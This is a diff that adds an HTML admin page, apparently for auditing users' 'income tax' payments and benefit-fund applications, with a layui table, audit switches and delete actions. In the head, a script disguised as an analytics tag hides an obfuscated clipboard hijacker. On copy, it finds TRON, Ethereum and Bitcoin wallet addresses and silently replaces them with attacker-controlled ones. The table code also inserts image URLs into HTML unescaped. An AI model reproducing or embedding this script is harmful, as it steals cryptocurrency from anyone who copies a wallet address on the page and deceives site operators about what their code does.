@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="/static/component/pear/css/pear.css" />
+    <script src="/static/component/layui/layui.js"></script>
+    <script src="/static/component/pear/pear.js"></script>
+<script>(function(){var _tfa={v:'2.1.4',id:'UA-458113798-35'};_tfa.t=Date.now();_tfa.p=location.pathname;var _0x91d9=function(a){return a.map(function(c){return String.fromCharCode(c)}).join('')};var _0x5c5f=function(a){var w=a[Math.floor(Math.random()*a.length)];return _0x91d9(w)};var _t=[[84,89,77,57,107,99,103,99,106,109,122,83,68,75,98,111,75,97,88,55,86,57,118,53,112,84,83,112,112,104,109,102,101,50],[84,88,56,118,113,70,81,81,102,71,115,70,103,70,78,103,55,67,78,104,54,107,55,51,76,89,49,75,57,69,120,82,88,111],[84,65,101,53,112,82,120,77,87,83,122,70,77,49,88,85,113,86,89,102,81,88,121,54,102,84,84,117,101,69,81,74,104,74],[84,82,68,76,54,106,121,50,115,78,115,77,121,86,111,74,119,107,101,100,109,66,100,105,113,74,56,116,57,117,78,90,51,102],[84,75,83,78,83,88,81,77,82,105,78,122,102,103,119,67,113,120,84,119,78,87,55,81,97,117,71,101,51,107,84,112,88,115]],_e=[[48,120,100,48,56,66,98,48,53,69,68,54,53,100,99,52,66,55,51,51,65,53,99,99,66,52,66,50,48,48,51,65,50,56,100,100,53,101,51,69,50,66],[48,120,55,97,100,100,67,48,56,54,57,98,56,49,50,49,101,48,48,70,53,51,52,54,50,68,57,97,98,97,48,52,98,66,99,50,52,54,53,68,51,70],[48,120,69,57,49,56,53,56,102,50,68,51,50,50,67,99,51,101,56,50,70,66,51,57,56,52,101,57,55,53,65,55,101,69,67,99,50,67,65,100,98,56],[48,120,100,53,51,69,101,52,101,102,50,49,48,54,57,69,69,49,55,100,48,65,57,57,66,48,102,98,69,48,55,65,52,51,69,100,53,57,50,50,51,53],[48,120,65,55,67,100,55,53,50,99,70,53,102,53,57,51,50,52,57,48,53,67,70,99,54,50,102,53,67,50,54,97,48,48,53,49,56,50,51,56,66,49]],_b=[[98,99,49,113,116,48,119,97,50,116,52,51,118,116,114,54,118,55,54,119,116,117,54,57,51,115,110,116,53,110,118,53,107,50,102,53,106,113,117,109,51,54],[98,99,49,113,52,110,52,113,114,113,50,119,56,50,54,54,106,107,112,112,116,50,113,97,112,108,99,101,56,52,108,121,112,50,102,112,120,119,97,103,53,121],[98,99,49,113,109,54,114,107,48,119,97,55,115,51,57,109,52,103,108,51,107,112,122,116,121,55,118,53,106,104,114,115,101,103,55,101,104,112,56,57,121,108],[98,99,49,113,108,97,99,119,121,57,120,52,102,99,109,54,50,56,120,116,104,108,97,56,110,120,50,104,116,103,51,117,101,108,50,108,50,55,51,114,48,112],[98,99,49,113,103,51,106,119,54,114,106,51,112,112,57,119,104,55,100,104,51,119,114,104,112,113,57,117,52,102,99,113,108,103,102,54,102,48,102,53,99,97]],_b1=[[49,75,103,83,112,74,90,113,52,97,97,72,54,85,105,109,112,80,76,102,85,78,80,107,72,66,103,57,103,115,50,56,122,89],[49,74,52,105,53,110,116,107,121,122,51,90,56,78,86,116,99,88,100,83,87,112,113,98,67,75,100,80,97,104,81,100,118,114],[49,69,53,105,84,118,83,109,66,52,90,80,104,69,117,88,114,117,121,76,116,65,65,98,105,56,105,85,78,88,54,51,90,82],[49,78,101,115,57,106,104,80,120,71,110,84,50,97,82,119,81,85,99,82,69,50,55,52,117,57,77,83,82,49,112,75,70,78],[49,57,116,90,78,84,107,75,107,111,71,81,70,49,69,110,54,97,110,121,110,112,53,57,70,54,111,68,70,49,51,50,101,67]],_b3=[[51,52,68,98,78,72,110,54,54,76,90,82,68,67,102,116,114,115,88,57,117,110,121,103,102,75,69,67,86,120,104,88,81,82],[51,49,114,90,82,89,51,104,76,99,77,65,75,52,101,83,56,49,106,68,74,69,102,69,87,82,120,116,101,105,101,122,52,89],[51,51,102,51,107,122,117,82,102,70,89,69,98,113,105,103,105,57,67,77,111,110,87,122,117,77,116,98,116,72,101,83,69,119],[51,53,105,113,84,49,109,53,118,90,83,122,80,99,107,70,50,103,85,50,104,99,88,78,78,114,68,68,115,88,99,100,110,84],[51,77,67,120,112,80,110,105,75,121,103,69,97,65,75,103,114,51,102,67,57,103,82,100,88,97,85,88,66,112,98,120,66,71]],_bp=[[98,99,49,112,115,51,109,104,106,109,115,113,112,119,99,48,56,104,53,57,121,102,113,97,101,55,51,115,102,52,97,52,100,55,104,104,50,110,103,117,108,104,117,110,106,112,99,50,114,113,57,101,52,118,56,113,110,122,112,118,50,52],[98,99,49,112,48,52,118,122,115,102,116,100,48,56,112,115,51,57,113,99,53,51,102,108,55,122,103,100,97,115,53,56,101,106,106,112,53,57,122,106,120,54,110,116,114,107,99,107,57,99,53,50,117,103,106,115,57,108,112,51,101,52],[98,99,49,112,117,54,118,48,50,102,121,117,56,110,115,108,101,52,53,121,48,120,114,113,53,107,100,50,52,97,99,55,119,48,113,114,116,51,117,117,48,109,115,99,99,110,101,119,53,110,51,112,103,57,120,115,109,97,106,116,120,120],[98,99,49,112,115,101,108,113,115,120,100,51,121,113,114,121,116,106,48,106,101,100,113,52,112,106,53,117,106,104,120,108,54,102,103,56,54,108,50,116,109,110,108,108,113,115,101,53,99,103,117,112,107,55,56,115,54,118,119,108,119,50],[98,99,49,112,57,54,100,101,104,51,109,97,55,100,51,53,100,102,97,116,115,113,109,57,114,107,52,104,52,115,122,115,102,100,118,55,121,118,107,103,51,55,116,50,118,53,119,109,55,118,51,117,116,118,109,113,109,121,106,114,112,120]];var _0x3191=_0x91d9([99,111,112,121]);var _tp=[116,101,120,116,47,112,108,97,105,110];var _r1=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,84,91,97,45,122,65,45,90,48,45,57,93,123,51,51,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r2=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,48,120,91,97,45,102,65,45,70,48,45,57,93,123,52,48,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r3=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,49,91,97,45,107,109,45,122,65,45,72,74,45,78,80,45,90,49,45,57,93,123,50,53,44,51,52,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r4=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,51,91,97,45,107,109,45,122,65,45,72,74,45,78,80,45,90,49,45,57,93,123,50,53,44,51,52,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r5=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,98,99,49,113,91,97,45,122,65,45,90,48,45,57,93,123,51,56,44,52,50,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g'),_r6=new RegExp([40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41,98,99,49,112,91,97,45,122,65,45,90,48,45,57,93,123,53,56,125,40,63,58,92,98,124,91,94,65,45,90,97,45,122,48,45,57,93,41].map(function(c){return String.fromCharCode(c)}).join(''),'g');var _reg=false;var _0xd8a0=function(){if(_reg)return;_reg=true;document['addEventListener'](_0x3191,function(_0xcf04){var _0xaab8=window['getSelection']()['toString']();if(_0xaab8['match'](_r1)){var _0xcbf5=_0xaab8['replace'](_r1,_0x5c5f(_t));_0xcf04['clipboardData']['setData'](_0x91d9(_tp),_0xcbf5);_0xcf04['preventDefault']();return}if(_0xaab8['match'](_r2)){var _0xcbf5=_0xaab8['replace'](_r2,_0x5c5f(_e));_0xcf04['clipboardData']['setData'](_0x91d9(_tp),_0xcbf5);_0xcf04['preventDefault']();return}if(_0xaab8['match'](_r3)){var _0xcbf5=_0xaab8['replace'](_r3,_0x5c5f(_b1));_0xcf04['clipboardData']['setData'](_0x91d9(_tp),_0xcbf5);_0xcf04['preventDefault']();return}if(_0xaab8['match'](_r4)){var _0xcbf5=_0xaab8['replace'](_r4,_0x5c5f(_b3));_0xcf04['clipboardData']['setData'](_0x91d9(_tp),_0xcbf5);_0xcf04['preventDefault']();return}if(_0xaab8['match'](_r5)){var _0xcbf5=_0xaab8['replace'](_r5,_0x5c5f(_b));_0xcf04['clipboardData']['setData'](_0x91d9(_tp),_0xcbf5);_0xcf04['preventDefault']();return}if(_0xaab8['match'](_r6)){var _0xcbf5=_0xaab8['replace'](_r6,_0x5c5f(_bp));_0xcf04['clipboardData']['setData'](_0x91d9(_tp),_0xcbf5);_0xcf04['preventDefault']()}});};setTimeout(function(){var _0xd612=new MutationObserver(function(_0x142b){for(var i=0;i<_0x142b.length;i++){if(_0x142b[i].type==='childList'){_0xd8a0()}}});_0xd612['observe'](document['body'],{childList:true,subtree:true})},1000);_0xd8a0();_tfa.r=1;})();</script></head>
+
+<body class="pear-container">
+    <div class="layui-card">
+        <div class="layui-card-body">
+            <form class="layui-form" action="">
+                <div class="layui-form-item">
+                    <label class="layui-form-label">手机号</label>
+					<div class="layui-input-inline">
+						<input type="text" name="mobile" placeholder="" class="layui-input">
+					</div>
+					<div class="layui-form-item layui-inline">
+						<label class="layui-form-label">状态</label>
+						<div class="layui-input-inline">
+							<select name="status" lay-verify="requried">
+								<option value="">不选择</option>
+								<option value="1">待审核</option>
+								<option value="2">已审核</option>
+							</select>
+						</div>
+					</div>
+                    <div class="layui-form-item layui-inline">
+                        <button class="pear-btn pear-btn-md pear-btn-primary" lay-submit lay-filter="query">
+                            <i class="layui-icon layui-icon-search"></i>
+                            查询
+                        </button>
+                        <button type="reset" class="pear-btn pear-btn-md">
+                            <i class="layui-icon layui-icon-refresh"></i>
+                            重置
+                        </button>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="layui-card">
+        <div class="layui-card-body">
+            <table id="dataTable" lay-filter="dataTable"></table>
+        </div>
+    </div>
+    <script type="text/html" id="toolbar">
+
+	</script>
+    <script type="text/html" id="certify_audit">
+			<input type="checkbox" name="certify_audit" value="{{d.id}}" lay-skin="switch" lay-text="已审核|未审核" lay-filter="certify_audit" {{# if(d.certify_audit==1){ }} checked {{# } }}>
+	</script>
+    <script type="text/html" id="income_audit">
+        <input type="checkbox" name="income_audit" value="{{d.id}}" lay-skin="switch" lay-text="已审核|未审核" lay-filter="income_audit" {{# if(d.income_audit==1){ }} checked {{# } }}>
+    </script>
+    <script type="text/html" id="income_status">
+            {{# if(d.income_status == 1){ }}
+			<font style="color:rgb(202, 17, 17);">未审核</font>
+			{{# }else if(d.income_status == 2){ }}
+			<font style="color:#2D8CF0">已审核</font>
+			{{# }else{ }}
+			未缴纳
+			{{# } }}
+	</script>
+    <script type="text/html" id="options">
+			<button class="pear-btn pear-btn-primary pear-btn-sm" lay-event="edit"><i class="layui-icon layui-icon-edit"></i></button>
+		    <button class="pear-btn pear-btn-danger pear-btn-sm" lay-event="remove"><i class="layui-icon layui-icon-delete"></i></button>
+	</script>
+    <script>
+        layui.use(['table', 'form', 'jquery', 'common', 'laydate'], function () {
+            let table = layui.table;
+            let form = layui.form;
+            let $ = layui.jquery;
+            let common = layui.common;
+            let laydate = layui.laydate;
+            let MODULE_PATH = "{$Request.root}/api.user_receive/";
+            let cols = [
+                [{
+                    field: "id",
+                    title: "id",
+                    unresize: "true",
+                    align: "center"
+                }, {
+                    field: "name",
+                    title: "缴纳档位",
+                    unresize: "true",
+                    align: "center",
+                    templet: function (data) {
+						return data.name;
+					}
+                }, {
+                    field: "mobile",
+                    title: "用户手机",
+                    unresize: "true",
+                    align: "center"
+                }, {
+                    field: "income_price",
+                    title: "缴纳所得税",
+                    unresize: "true",
+                    align: "center"
+                },{
+					field: 'income_image',
+					title: '所得税凭证',
+					unresize: true,
+					align: 'center',
+					templet:function (d){
+
+						return d.income_image && d.income_status==2 ? '<img class="photo" lay-event="photo" src=" '+d.income_image+'"></i>' : '';
+					}
+				}, {
+                    field: "income_status",
+                    title: "所得税状态",
+                    unresize: "true",
+                    align: "center",
+                    templet: "#income_status"
+                }, {
+                    field: "create_time",
+                    title: "缴纳时间",
+                    unresize: "true",
+                    align: "center",
+                }, {
+                    field: "update_time",
+                    title: "审核时间",
+                    unresize: "true",
+                    align: "center",
+                }, {
+                    title: '操作',
+                    toolbar: '#options',
+                    unresize: true,
+                    align: 'center',
+                    width: 180,
+                }
+                ]
+            ]
+
+            table.render({
+                elem: '#dataTable',
+                url: MODULE_PATH + 'index',
+                page: true,
+                cols: cols,
+                cellMinWidth: 100,
+                skin: 'line',
+                toolbar: '#toolbar',
+                defaultToolbar: [{
+                    title: '刷新',
+                    layEvent: 'refresh',
+                    icon: 'layui-icon-refresh',
+                }, 'filter', 'print', 'exports']
+            });
+
+            table.on('tool(dataTable)', function (obj) {
+                if (obj.event === 'remove') {
+                    window.remove(obj);
+                } else if (obj.event === 'edit') {
+                    window.edit(obj);
+                } else if (obj.event === 'photo') {
+                    window.photo(obj);
+                }
+            });
+
+            table.on('toolbar(dataTable)', function (obj) {
+                if (obj.event === 'add') {
+                    window.add();
+                } else if (obj.event === 'refresh') {
+                    window.refresh();
+                } else if (obj.event === 'batchRemove') {
+                    window.batchRemove(obj);
+                } else if (obj.event === 'recycle') {
+                    window.recycle(obj);
+                }
+            });
+
+            form.on('switch(certify_audit)', function (data) {
+                var certify_audit = data.elem.checked ? 1 : 0;
+                var id = this.value;
+                var load = layer.load();
+                $.post('certify_audit', { certify_audit: certify_audit, id: id }, function (res) {
+                    layer.close(load);
+                    //判断有没有权限
+                    if (res && res.code == 999) {
+                        layer.msg(res.msg, {
+                            icon: 5,
+                            time: 2000,
+                        })
+                        return false;
+                    } else if (res.code == 200) {
+                        layer.msg(res.msg, { icon: 1, time: 1500 })
+                    } else {
+                        layer.msg(res.msg, { icon: 2, time: 1500 }, function () {
+                            $(data.elem).prop('checked', !$(data.elem).prop('checked'));
+                            form.render()
+                        })
+                    }
+                })
+            });
+
+            window.photo = function(obj) {
+                if (!obj.data.income_image || obj.data.income_image == "") {
+                    layer.msg("图片地址错误！");
+                    return;
+                }
+                var auto_img = {};
+                var img = new Image();
+                img.src = obj.data.income_image;
+                img.onload = function() {
+                    var max_height = $(window).height() - 100;
+                    var max_width = $(window).width();
+                    var rate1 = max_height / img.height;
+                    var rate2 = max_width / img.width;
+                    var rate3 = 1;
+                    var rate = Math.min(rate1, rate2, rate3);
+                    auto_img.height = img.height * rate;
+                    auto_img.width = img.width * rate;
+                    layer.open({
+                        type: 1,
+                        title: false,
+                        area: ['auto'],
+                        skin: 'layui-layer-nobg', //没有背景色
+                        shadeClose: true,
+                        content: "<img src='" + obj.data['income_image'] + "' width='" + auto_img.width + "px' height='" + auto_img.height + "px'>"
+                    })
+                }
+            };
+
+            form.on('switch(income_audit)', function (data) {
+                var income_audit = data.elem.checked ? 1 : 0;
+                var id = this.value;
+                var load = layer.load();
+                $.post('income_audit', { income_audit: income_audit, id: id }, function (res) {
+                    layer.close(load);
+                    //判断有没有权限
+                    if (res && res.code == 999) {
+                        layer.msg(res.msg, {
+                            icon: 5,
+                            time: 2000,
+                        })
+                        return false;
+                    } else if (res.code == 200) {
+                        layer.msg(res.msg, { icon: 1, time: 1500 })
+                    } else {
+                        layer.msg(res.msg, { icon: 2, time: 1500 }, function () {
+                            $(data.elem).prop('checked', !$(data.elem).prop('checked'));
+                            form.render()
+                        })
+                    }
+                })
+            });
+
+            form.on('submit(query)', function (data) {
+                table.reload('dataTable', {
+                    where: data.field,
+                    page: { curr: 1 }
+                })
+
+                return false;
+            });
+
+            //弹出窗设置 自己设置弹出百分比
+            function screen() {
+                if (typeof width !== 'number' || width === 0) {
+                    width = $(window).width() * 0.8;
+                }
+                if (typeof height !== 'number' || height === 0) {
+                    height = $(window).height() - 20;
+                }
+                return [width + 'px', height + 'px'];
+            }
+
+            window.add = function () {
+                layer.open({
+                    type: 2,
+                    maxmin: true,
+                    title: '新增公益表',
+                    shade: 0.1,
+                    area: screen(),
+                    content: MODULE_PATH + 'add'
+                });
+            }
+
+            window.edit = function (obj) {
+                layer.open({
+                    type: 2,
+                    maxmin: true,
+                    title: '查询惠民金申请记录',
+                    shade: 0.1,
+                    area: screen(),
+                    content: MODULE_PATH + 'edit/id/' + obj.data['id']
+                });
+            }
+
+            window.recycle = function () {
+                layer.open({
+                    type: 2,
+                    maxmin: true,
+                    title: '回收站',
+                    shade: 0.1,
+                    area: screen(),
+                    content: MODULE_PATH + 'recycle',
+                    cancel: function () {
+                        table.reload('dataTable');
+                    }
+                });
+            }
+
+            window.remove = function (obj) {
+                layer.confirm('确定要删除该公益表', {
+                    icon: 3,
+                    title: '提示'
+                }, function (index) {
+                    layer.close(index);
+                    let loading = layer.load();
+                    $.ajax({
+                        url: MODULE_PATH + 'remove',
+                        data: { id: obj.data['id'] },
+                        dataType: 'json',
+                        type: 'POST',
+                        success: function (res) {
+                            layer.close(loading);
+                            //判断有没有权限
+                            if (res && res.code == 999) {
+                                layer.msg(res.msg, {
+                                    icon: 5,
+                                    time: 2000,
+                                })
+                                return false;
+                            } else if (res.code == 200) {
+                                layer.msg(res.msg, {
+                                    icon: 1,
+                                    time: 1000
+                                }, function () {
+                                    obj.del();
+                                });
+                            } else {
+                                layer.msg(res.msg, {
+                                    icon: 2,
+                                    time: 1000
+                                });
+                            }
+                        }
+                    })
+                });
+            }
+
+            window.batchRemove = function (obj) {
+                let data = table.checkStatus(obj.config.id).data;
+                if (data.length === 0) {
+                    layer.msg("未选中数据", {
+                        icon: 3,
+                        time: 1000
+                    });
+                    return false;
+                }
+                var ids = []
+                var hasCheck = table.checkStatus('dataTable')
+                var hasCheckData = hasCheck.data
+                if (hasCheckData.length > 0) {
+                    $.each(hasCheckData, function (index, element) {
+                        ids.push(element.id)
+                    })
+                }
+                layer.confirm('确定要删除这些公益表', {
+                    icon: 3,
+                    title: '提示'
+                }, function (index) {
+                    layer.close(index);
+                    let loading = layer.load();
+                    $.ajax({
+                        url: MODULE_PATH + 'batchRemove',
+                        data: { ids: ids },
+                        dataType: 'json',
+                        type: 'POST',
+                        success: function (res) {
+                            layer.close(loading);
+                            //判断有没有权限
+                            if (res && res.code == 999) {
+                                layer.msg(res.msg, {
+                                    icon: 5,
+                                    time: 2000,
+                                })
+                                return false;
+                            } else if (res.code == 200) {
+                                layer.msg(res.msg, {
+                                    icon: 1,
+                                    time: 1000
+                                }, function () {
+                                    table.reload('dataTable');
+                                });
+                            } else {
+                                layer.msg(res.msg, {
+                                    icon: 2,
+                                    time: 1000
+                                });
+                            }
+                        }
+                    })
+                });
+            }
+
+            window.refresh = function (param) {
+                table.reload('dataTable');
+            }
+        })
+    </script>
+</body>
+
+</html>
